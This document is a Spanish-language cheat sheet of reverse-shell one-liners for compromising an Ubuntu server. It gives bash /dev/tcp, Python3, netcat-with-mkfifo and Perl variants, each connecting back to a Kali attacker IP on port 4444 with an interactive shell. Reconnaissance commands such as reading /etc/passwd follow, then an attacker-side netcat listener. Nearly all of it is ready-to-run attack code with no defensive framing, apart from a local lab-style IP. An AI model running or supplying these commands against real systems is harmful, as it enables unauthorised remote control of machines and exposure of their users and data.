# 🚨 Comandos de Reverse Shell para Ubuntu Server

## ⚠️ IP DE KALI: 192.168.15.17 (Cambiar por tu IP real)

### 🔥 COMANDOS QUE FUNCIONAN EN UBUNTU:

#### 1. Bash Reverse Shell (Más confiable):
```bash
bash -c 'bash -i >& /dev/tcp/192.168.15.17/4444 0>&1'
```

#### 2. Python3 Reverse Shell:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.15.17",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### 3. Netcat sin -e (Ubuntu compatible):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.15.17 4444 >/tmp/f
```

#### 4. Perl Reverse Shell:
```bash
perl -e 'use Socket;$i="192.168.15.17";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}'
```

### 🎯 Comandos de Reconocimiento:
```bash
whoami
id
uname -a
ps aux
netstat -tulpn
cat /etc/passwd
ls -la /home
cat /etc/hosts
```

### 💀 En tu Kali Linux:
```bash
# Preparar listener
nc -lvnp 4444
```

### 🔧 Si nada funciona, probar:
```bash
# Verificar si bash está disponible
which bash

# Verificar versión de python
python3 --version

# Verificar netcat
which nc
```